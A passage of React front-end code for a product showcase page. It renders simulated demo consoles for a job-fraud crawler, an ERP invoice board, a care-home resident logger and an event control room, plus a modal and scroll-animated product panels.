        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Mule Bank Tracing</span>
          <span className="text-[10px] font-bold text-green-400">ACTIVE INFRA</span>
        </div>
      </div>

      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Logs */}
        <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/80 border-glass-border flex flex-col gap-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">JobGuard Shell Crawler</span>
          <div className="flex-1 overflow-y-auto max-h-[120px] flex flex-col gap-1.5 text-[9px] pr-1">
            {logs.map((log, i) => (
              <div key={i} className={log.includes('BERT') ? 'text-accent-gold' : log.includes('DISRUPT') ? 'text-red-400' : log.includes('OK') ? 'text-green-400' : 'text-beige-300/60'}>
                {log}
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="flex gap-3 mt-auto">
        <button
          onClick={runCrawl}
          disabled={crawling}
          data-cursor="link"
          className="px-4 py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors disabled:opacity-50 text-[10px]"
        >
          {crawling ? 'Crawling Portals...' : 'Crawl Recruitment Portals'}
        </button>
        <button
          onClick={triggerTakedown}
          disabled={nodesCount === 0}
          data-cursor="link"
          className="px-4 py-2 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded hover:border-accent-gold/40 transition-colors disabled:opacity-50 text-[10px]"
        >
          Generate Abuse Takedown
        </button>
      </div>
    </div>
  )
}

/* ─── MINTS ERP RESOURCE SANDBOX ─── */
function MintsERPSandbox() {
  const [revenue, setRevenue] = useState(248930)
  const [tasks, setTasks] = useState([
    { id: 1, title: 'Database Migration', status: 'todo' },
    { id: 2, title: 'UI Design Polish', status: 'in-progress' },
    { id: 3, title: 'Security Posture Audit', status: 'done' }
  ])
  const [clientName, setClientName] = useState('')
  const [invoiceAmount, setInvoiceAmount] = useState('')
  const [invoices, setInvoices] = useState([])

  const advanceTask = (id) => {
    setTasks(prev => prev.map(t => {
      if (t.id !== id) return t
      const nextStatus = t.status === 'todo' ? 'in-progress' : t.status === 'in-progress' ? 'done' : 'todo'
      return { ...t, status: nextStatus }
    }))
    playSuccessSound()
  }

  const generateInvoice = (e) => {
    e.preventDefault()
    if (!clientName || !invoiceAmount) return
    const amt = parseFloat(invoiceAmount)
    if (isNaN(amt)) return
    setInvoices(prev => [`INV-2026-${prev.length + 1}: ${clientName.toUpperCase()} — AED ${amt.toLocaleString()} (PENDING)`, ...prev])
    setRevenue(prev => prev + amt)
    setClientName('')
    setInvoiceAmount('')
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      {/* KPI Stats */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Total Revenue</span>
          <span className="text-xl font-bold font-number text-accent-gold">AED {revenue.toLocaleString()}</span>
        </div>
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Generated Invoices</span>
          <span className="text-xl font-bold text-beige-100">{invoices.length} Total</span>
        </div>
      </div>

      {/* Main split: Kanban Board & Invoice Builder */}
      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Kanban Board */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Project Board (Click tasks to advance)</span>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 flex-1 min-h-[140px]">
            {['todo', 'in-progress', 'done'].map(column => (
              <div key={column} className="liquid-glass-panel p-2.5 bg-bg-deep/40 border-glass-border flex flex-col gap-2">
                <span className="text-[8px] uppercase tracking-widest text-beige-300 border-b border-white/5 pb-1">
                  {column.replace('-', ' ')}
                </span>
                <div className="flex flex-col gap-2 overflow-y-auto max-h-[150px]">
                  {tasks.filter(t => t.status === column).map(t => (
                    <button
                      key={t.id}
                      onClick={() => advanceTask(t.id)}
                      data-cursor="link"
                      className="p-2 rounded bg-bg-elevated border border-white/5 text-[9px] text-left hover:border-accent-gold/40 transition-colors"
                    >
                      {t.title}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Invoice Generator */}
        <form onSubmit={generateInvoice} className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Invoice Builder</span>
          <div className="flex flex-col gap-1.5">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Client Name</label>
            <input
              type="text"
              value={clientName}
              onChange={e => setClientName(e.target.value)}
              placeholder="Fellora AE"
              className="w-full bg-bg-deep border border-glass-border rounded px-2.5 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold"
            />
          </div>
          <div className="flex flex-col gap-1.5">
            <label className="text-[8px] uppercase tracking-wider text-beige-300">Amount (AED)</label>
            <input
              type="number"
              value={invoiceAmount}
              onChange={e => setInvoiceAmount(e.target.value)}
              placeholder="12000"
              className="w-full bg-bg-deep border border-glass-border rounded px-2.5 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold"
            />
          </div>
          <button
            type="submit"
            data-cursor="link"
            className="w-full py-2 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors mt-auto text-[10px] uppercase tracking-wider"
          >
            Create Invoice
          </button>
        </form>
      </div>

      {/* Invoice Timeline */}
      {invoices.length > 0 && (
        <div className="flex flex-col gap-2">
          <span className="text-[9px] uppercase tracking-wider text-beige-300">Invoice Log</span>
          <div className="liquid-glass-panel p-3 bg-bg-deep/40 border-glass-border max-h-[100px] overflow-y-auto flex flex-col gap-1 text-[9px] text-beige-300">
            {invoices.map((inv, index) => (
              <div key={index}>{inv}</div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

/* ─── MINTCARE MANAGEMENT SANDBOX ─── */
function MintCareSandbox() {
  const [heartRate, setHeartRate] = useState(76)
  const [temp, setTemp] = useState(36.8)
  const [careLogs, setCareLogs] = useState([
    '10:15 AM - Breakfast served (Standard health diet)',
    '11:30 AM - Morning walk and physio review (Stable response)'
  ])
  const [newLog, setNewLog] = useState('')
  const [vitalsCheck, setVitalsCheck] = useState(false)

  const checkVitals = () => {
    if (vitalsCheck) return
    setVitalsCheck(true)
    setTimeout(() => {
      setHeartRate(Math.floor(Math.random() * 18) + 68)
      setTemp((Math.random() * 0.8 + 36.3).toFixed(1))
      setCareLogs(prev => [`[SYSTEM] Vitals automated review recorded.`, ...prev])
      setVitalsCheck(false)
      playSuccessSound()
    }, 800)
  }

  const dispatchMeds = () => {
    setCareLogs(prev => [`[MEDS] Administered prescribed check dosage successfully.`, ...prev])
    playSuccessSound()
  }

  const addLog = (e) => {
    e.preventDefault()
    if (!newLog) return
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    setCareLogs(prev => [`${time} - ${newLog}`, ...prev])
    setNewLog('')
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        {/* Resident info */}
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Resident</span>
          <span className="text-base font-bold text-beige-100">Albert Johnson</span>
        </div>
        {/* Heart Rate */}
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Heart Rate</span>
          <span className="text-base font-bold text-green-400 flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-green-400 animate-ping" />
            {vitalsCheck ? '...' : `${heartRate} bpm`}
          </span>
        </div>
        {/* Temperature */}
        <div className="liquid-glass-panel p-4 flex flex-col gap-1 border-glass-border">
          <span className="text-[10px] text-beige-300 uppercase tracking-widest">Temp</span>
          <span className="text-base font-bold text-accent-gold">{vitalsCheck ? '...' : `${temp} °C`}</span>
        </div>
      </div>

      {/* Splits */}
      <div className="flex flex-col md:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Actions panel */}
        <div className="w-full md:w-1/3 flex flex-col gap-3 liquid-glass-panel p-4 border-glass-border bg-bg-deep/20 justify-center">
          <span className="text-[10px] uppercase tracking-wider text-beige-300 border-b border-white/5 pb-1">Resident Care Controls</span>
          <button
            onClick={checkVitals}
            disabled={vitalsCheck}
            data-cursor="link"
            className="w-full py-2.5 border border-glass-border bg-glass-fill hover:bg-glass-fill-light text-beige-100 rounded text-[10px] uppercase tracking-wider disabled:opacity-50"
          >
            {vitalsCheck ? 'Measuring...' : 'Check Vitals'}
          </button>
          <button
            onClick={dispatchMeds}
            data-cursor="link"
            className="w-full py-2.5 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[10px] uppercase tracking-wider"
          >
            Dispatch Meds
          </button>
        </div>

        {/* Live logs log */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Timelined Resident Log</span>
          <div className="flex-1 liquid-glass-panel p-4 bg-bg-deep/40 border-glass-border flex flex-col gap-3">
            {/* Form */}
            <form onSubmit={addLog} className="flex gap-2">
              <input
                type="text"
                value={newLog}
                onChange={e => setNewLog(e.target.value)}
                placeholder="Log lunch serving, outing review..."
                className="flex-1 bg-bg-deep border border-glass-border rounded px-3 py-1.5 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-xs"
              />
              <button
                type="submit"
                data-cursor="link"
                className="px-4 py-1.5 bg-beige-100 text-bg-deep font-bold rounded hover:bg-accent-gold transition-colors text-xs shrink-0"
              >
                Log Care
              </button>
            </form>
            {/* History */}
            <div className="flex-1 overflow-y-auto max-h-[140px] flex flex-col gap-2 pr-2 text-[10px] text-beige-300">
              {careLogs.map((log, index) => (
                <div key={index} className="flex gap-2 border-l border-accent-gold/40 pl-2.5">
                  {log}
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ─── MINORA EVENT CONTROLLER SANDBOX ─── */
function MinoraSandbox() {
  const [alertTicker, setAlertTicker] = useState('WELCOME TO MINORA LIVE COMMAND CENTRE')
  const [newAlert, setNewAlert] = useState('')
  const [chat, setChat] = useState([
    { user: 'Sarah J.', msg: 'Has the keynote started?' },
    { user: 'David C.', msg: 'Visual feed looks extremely sharp!' }
  ])
  const [myMsg, setMyMsg] = useState('')

  const broadcastAlert = (e) => {
    e.preventDefault()
    if (!newAlert) return
    setAlertTicker(`ALERT: ${newAlert.toUpperCase()}`)
    setNewAlert('')
    playSuccessSound()
  }

  const sendChat = (e) => {
    e.preventDefault()
    if (!myMsg) return
    setChat(prev => [...prev, { user: 'HOST ADMIN', msg: myMsg }])
    setMyMsg('')
    playSuccessSound()
  }

  return (
    <div className="flex flex-col gap-6 h-full text-beige-100 font-mono text-xs">
      {/* Live Alerts Ticker */}
      <div className="w-full bg-red-950/20 border border-red-900/30 px-4 py-2 rounded text-[10px] text-red-400 font-bold overflow-hidden whitespace-nowrap relative">
        <div className="inline-block animate-[ticker_18s_linear_infinite]">
          {alertTicker} &nbsp;&nbsp;✦&nbsp;&nbsp; {alertTicker}
        </div>
      </div>

      {/* Screen Monitor Feeds */}
      <div className="flex flex-col lg:flex-row gap-6 flex-1 min-h-[220px]">
        {/* Feeds grid */}
        <div className="flex-1 flex flex-col gap-3">
          <span className="text-[10px] uppercase tracking-wider text-beige-300">Live Camera Feeds</span>
          <div className="grid grid-cols-2 gap-3 flex-1 min-h-[140px]">
            {['STAGE MAIN CAM', 'BACKSTAGE INTERVIEW', 'AUDIENCE SECTOR B', 'PRESENTATION DECK'].map((name, i) => (
              <div key={i} className="liquid-glass-panel relative aspect-video bg-bg-deep/80 border-glass-border flex items-center justify-center overflow-hidden">
                {/* Simulated scan lines */}
                <div className="absolute inset-0 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[size:100%_4px,3px_100%] pointer-events-none z-10" />
                <span className="text-[8px] text-white/40 uppercase tracking-widest relative z-20">{name} [LIVE]</span>
                <span className="absolute top-2 left-2 text-[6px] text-red-500 bg-red-950/40 border border-red-500/20 px-1 rounded animate-pulse">REC</span>
              </div>
            ))}
          </div>
        </div>

        {/* Audience Chat & Alerts broadcast */}
        <div className="w-full lg:w-1/3 flex flex-col gap-4">
          {/* Ticker Broadcast */}
          <form onSubmit={broadcastAlert} className="liquid-glass-panel p-3 border-glass-border bg-bg-deep/20 flex flex-col gap-2">
            <span className="text-[9px] uppercase tracking-wider text-beige-300">Ticker Broadcaster</span>
            <div className="flex gap-2">
              <input
                type="text"
                value={newAlert}
                onChange={e => setNewAlert(e.target.value)}
                placeholder="keynote starting in 5m..."
                className="flex-1 bg-bg-deep border border-glass-border rounded px-2.5 py-1 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-[10px]"
              />
              <button
                type="submit"
                data-cursor="link"
                className="px-3 py-1 bg-accent-gold text-bg-deep font-bold rounded hover:bg-beige-100 transition-colors text-[9px] uppercase"
              >
                Send
              </button>
            </div>
          </form>

          {/* Q&A chat */}
          <div className="liquid-glass-panel p-3 border-glass-border bg-bg-deep/20 flex-1 flex flex-col gap-2">
            <span className="text-[9px] uppercase tracking-wider text-beige-300">Live Q&A Monitor</span>
            <div className="flex-1 overflow-y-auto max-h-[100px] flex flex-col gap-2 text-[9px] pr-1">
              {chat.map((c, i) => (
                <div key={i} className="flex flex-col gap-0.5">
                  <span className={c.user === 'HOST ADMIN' ? 'text-accent-gold font-bold' : 'text-beige-100 font-bold'}>
                    {c.user}
                  </span>
                  <span className="text-beige-300">{c.msg}</span>
                </div>
              ))}
            </div>
            <form onSubmit={sendChat} className="flex gap-2 border-t border-white/5 pt-2">
              <input
                type="text"
                value={myMsg}
                onChange={e => setMyMsg(e.target.value)}
                placeholder="Answer user question..."
                className="flex-1 bg-bg-deep border border-glass-border rounded px-2.5 py-1 text-beige-100 placeholder:text-white/20 focus:outline-none focus:border-accent-gold text-[10px]"
              />
              <button
                type="submit"
                data-cursor="link"
                className="px-3 py-1 bg-beige-100 text-bg-deep font-bold rounded hover:bg-accent-gold transition-colors text-[9px] uppercase"
              >
                Post
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )
}

export function SandboxModal({ product, onClose }) {
  const prefersReducedMotion = usePrefersReducedMotion()

  useEffect(() => {
    const handleKey = (e) => { if (e.key === 'Escape') onClose() }
    window.addEventListener('keydown', handleKey)
    return () => window.removeEventListener('keydown', handleKey)
  }, [onClose])

  return (
    <AnimatePresence>
      {product && (
        <motion.div
          className="fixed inset-0 z-[250] flex items-center justify-center p-4 sm:p-6 md:p-10"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0, backdropFilter: 'blur(0px)' }}
            animate={{ opacity: 1, backdropFilter: 'blur(16px)' }}
            exit={{ opacity: 0, backdropFilter: 'blur(0px)' }}
            transition={{ duration: 0.5 }}
            className="absolute inset-0 bg-bg-deep/80 pointer-events-auto"
            onClick={onClose}
          />

          {/* Dialog Container */}
          <motion.div
            initial={prefersReducedMotion ? { opacity: 0 } : { opacity: 0, scale: 0.9, y: 40 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={prefersReducedMotion ? { opacity: 0 } : { opacity: 0, scale: 0.95, y: 20 }}
            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
            className="relative z-10 w-full max-w-4xl max-h-[90vh] overflow-y-auto liquid-glass-panel border-glass-border flex flex-col pointer-events-auto shadow-[0_0_50px_rgba(0,0,0,0.8)] backdrop-blur-3xl bg-bg-deep/50"
          >
            {/* Header */}
            <div className="flex items-center justify-between px-4 md:px-6 py-4 md:py-5 border-b border-glass-border bg-bg-elevated/40 relative z-20">
              <div>
                <span className="font-mono text-[9px] uppercase tracking-widest text-accent-gold mb-1 block">
                  {product.tagline}
                </span>
                <h3 className="font-display font-bold text-xl md:text-2xl text-beige-100 flex items-center gap-3">
                  {product.label} Sandbox
                  {product.statusBadge && (
                    <span
                      className="px-2 py-0.5 rounded-sm border font-mono text-[8px] uppercase tracking-wider font-semibold"
                      style={{
                        borderColor: product.color + '45',
                        color: product.color,
                        background: product.color + '12',
                      }}
                    >
                      {product.statusBadge}
                    </span>
                  )}
                  <span className="text-[10px] font-mono font-medium px-2 py-0.5 border border-green-500/30 text-green-400 bg-green-950/20 rounded-full flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                    LIVE RUNNING
                  </span>
                </h3>
              </div>
              <button
                onClick={onClose}
                data-cursor="link"
                className="w-9 h-9 rounded-full border border-glass-border flex items-center justify-center text-beige-300 hover:text-accent-gold hover:border-accent-gold/40 transition-colors font-mono text-sm"
              >
                ✕
              </button>
            </div>

            {/* Sandbox viewport */}
            <div className="p-4 md:p-6 bg-bg-deep/20 relative z-10 flex-1 overflow-y-auto">
              {product.id === 'shielddesk' && <ShieldDeskSandbox />}
              {product.id === 'vmp' && <VmpSandbox />}
              {product.id === 'sentineliot' && <SentinelIotSandbox />}
              {product.id === 'smecyber' && <SmeCyberSandbox />}
              {product.id === 'securevault' && <SecureVaultSandbox />}
              {product.id === 'jobguard' && <JobGuardSandbox />}
              {product.id === 'erp' && <MintsERPSandbox />}
              {product.id === 'mintcare' && <MintCareSandbox />}
              {product.id === 'minora' && <MinoraSandbox />}
            </div>

            {/* Footer */}
            <div className="px-4 md:px-6 py-3 md:py-4 border-t border-glass-border bg-bg-elevated/20 flex flex-col sm:flex-row items-center justify-between gap-3 text-[10px] font-mono text-beige-300/40 relative z-20">
              <span>Mints Global Sandbox Sandbox v1.0.4</span>
              <span>Fully simulated environment</span>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  )
}

function ProductBay({ product, setSandboxProduct, i }) {
  const containerRef = useRef(null)
  const { scrollYProgress } = useScroll({
    target: containerRef,
    offset: ["start end", "end start"]
  })
  
  const y = useTransform(scrollYProgress, [0, 1], ["20%", "-20%"])
  const opacity = useTransform(scrollYProgress, [0, 0.3, 0.7, 1], [0, 1, 1, 0])

  return (
    <div ref={containerRef} className="relative w-full h-[150vh] pointer-events-auto">
      <div className="sticky top-0 h-screen w-full overflow-hidden flex items-center justify-center">
        {/* Deep background color */}
        <div className="absolute inset-0 z-0 bg-bg-deep">
          {/* Subtle Image Backdrop */}
          <motion.img 
            style={{ scale: 1.1, opacity: 0.15 }}
            src={product.image} 
            className="w-full h-full object-cover mix-blend-luminosity"
          />
          {/* Dynamic Ambient Glow Orb */}
          <motion.div 
            style={{ 
              background: `radial-gradient(circle, ${product.color}40 0%, transparent 70%)`,
              y: useTransform(scrollYProgress, [0, 1], ["-20%", "20%"])
            }}
            className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[80vw] h-[80vw] max-w-[1000px] max-h-[1000px] rounded-full blur-[100px] opacity-40 mix-blend-screen pointer-events-none"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-bg-deep via-transparent to-bg-deep" />
        </div>

        {/* Specs Text Sliding Overlay */}
        <motion.div 
          style={{ y, opacity }}
          className="relative z-10 w-full max-w-[1400px] px-6 md:px-16 lg:px-24 flex flex-col md:flex-row gap-8 lg:gap-16 items-center justify-center"
        >
          {/* Watermark Badge behind content */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 pointer-events-none z-[-1] hidden md:block">
            <span className="font-number text-[20vw] text-accent-gold/5 leading-none">{product.badge}</span>
          </div>

          <motion.div 
            initial={{ opacity: 0, x: -50 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ once: true, margin: "-10%" }}
            transition={{ duration: 0.8, ease: "easeOut" }}
            className="flex-1 flex flex-col gap-6 liquid-glass-panel p-8 md:p-12 border-glass-border backdrop-blur-2xl bg-bg-deep/40 shadow-2xl shadow-black/50 hover:border-accent-gold/30 transition-colors duration-500 relative overflow-hidden group/panel"
          >
            {/* Subtle glow on hover */}
            <div className="absolute inset-0 bg-gradient-to-br from-accent-gold/0 via-accent-gold/0 to-accent-gold/5 opacity-0 group-hover/panel:opacity-100 transition-opacity duration-700 pointer-events-none" />

            <div className="flex items-center gap-4 relative z-10">
              <span className="font-number text-5xl md:text-6xl text-accent-gold opacity-80 drop-shadow-[0_0_15px_rgba(201,168,76,0.3)]">{product.badge}</span>
              <div className="flex flex-col">
                <span className="font-mono text-[10px] text-accent-gold tracking-widest uppercase">{product.tagline}</span>
                <h3 className="font-display text-3xl md:text-5xl font-bold text-white uppercase tracking-tight">{product.label}</h3>
              </div>
            </div>
            
            <p className="font-body text-beige-300 text-base md:text-lg max-w-xl relative z-10 leading-relaxed">
              {product.description}
            </p>

            <div className="flex flex-wrap gap-2 mt-2 relative z-10">
              {product.features.map(f => (
                <span key={f} className="px-3 py-1.5 border border-white/10 bg-black/40 font-mono text-[9px] uppercase tracking-wider text-beige-100 hover:border-accent-gold/40 hover:text-accent-gold transition-colors cursor-default">
                  {f}
                </span>
              ))}
            </div>

            <button 
              onClick={() => setSandboxProduct(product)}
              className="mt-6 self-start group relative overflow-hidden border border-accent-gold bg-transparent px-8 py-4 font-mono text-[10px] tracking-widest uppercase text-accent-gold transition-all duration-300 hover:scale-105"
            >
              <div className="absolute inset-0 bg-accent-gold translate-y-[100%] group-hover:translate-y-0 transition-transform duration-300 ease-out" />
              <span className="relative z-10 group-hover:text-bg-deep font-bold transition-colors duration-300 flex items-center gap-3">
                Access Console
                <span className="w-1.5 h-1.5 rounded-full bg-accent-gold group-hover:bg-bg-deep animate-pulse" />
              </span>
            </button>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, x: 50 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ once: true, margin: "-10%" }}
            transition={{ duration: 0.8, ease: "easeOut", delay: 0.2 }}
            className="flex-1 w-full flex items-center justify-center md:-ml-8 lg:-ml-16 z-20"
          >
            <div className="relative w-full max-w-[600px] aspect-video border border-white/20 liquid-glass-panel p-2 flex flex-col gap-2 bg-black/40 backdrop-blur-md shadow-2xl shadow-black/80 group">
              <div className="flex justify-between items-center px-3 py-1 border-b border-white/5">
                <span className="font-mono text-[9px] text-beige-300 uppercase tracking-widest flex items-center gap-2">
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                  System Preview
                </span>
                <span className="w-1.5 h-1.5 rounded-full bg-neon-green animate-pulse shadow-[0_0_8px_#00FF9D]" />
              </div>
              <div className="flex-1 border border-white/10 bg-black/60 overflow-hidden relative">
                <img src={product.image} className="w-full h-full object-cover opacity-70 group-hover:opacity-100 group-hover:scale-110 transition-all duration-1000 ease-out" />
                <div className="absolute inset-0 bg-accent-gold/10 mix-blend-overlay pointer-events-none group-hover:opacity-0 transition-opacity duration-1000" />
                {/* Scanner line effect */}
                <div className="absolute top-0 left-0 w-full h-[2px] bg-accent-gold/50 shadow-[0_0_10px_rgba(201,168,76,0.8)] -translate-y-full group-hover:animate-scan pointer-events-none" />
              </div>
            </div>
          </motion.div>
        </motion.div>
      </div>
    </div>
  )
}

export default function ProductDemo() {
  const [sandboxProduct, setSandboxProduct] = useState(null)

  return (
    <section id="products" className="relative z-10 w-full flex flex-col pointer-events-auto bg-bg-deep">
      
      {/* Header */}
      <div className="sticky top-0 z-20 w-full px-6 md:px-16 lg:px-24 pt-24 pb-8 bg-gradient-to-b from-bg-deep to-transparent pointer-events-none">
        <div className="max-w-[1400px] w-full mx-auto flex flex-col gap-4">
          <div className="flex items-center gap-3">
            <span className="w-2 h-2 rounded-full bg-accent-gold animate-pulse" />
            <span className="font-mono text-[10px] tracking-widest uppercase text-accent-gold">Level 02 // Live Ops</span>
          </div>
          <h2 className="font-display text-4xl md:text-6xl font-bold tracking-tight text-white uppercase">
            Active <span className="text-shimmer">Consoles</span>
          </h2>
        </div>
      </div>

      {/* Product Bays */}
      <div className="w-full flex flex-col relative z-10 mt-[-100px]">
        {PRODUCTS.map((product, i) => (
          <ProductBay
            key={product.id}
            product={product}
            setSandboxProduct={setSandboxProduct}
            i={i}
          />
        ))}
      </div>

      {/* Interactive Sandbox Overlay Modal */}
      <SandboxModal
        product={sandboxProduct}
        onClose={() => setSandboxProduct(null)}
      />
    </section>
  )
}
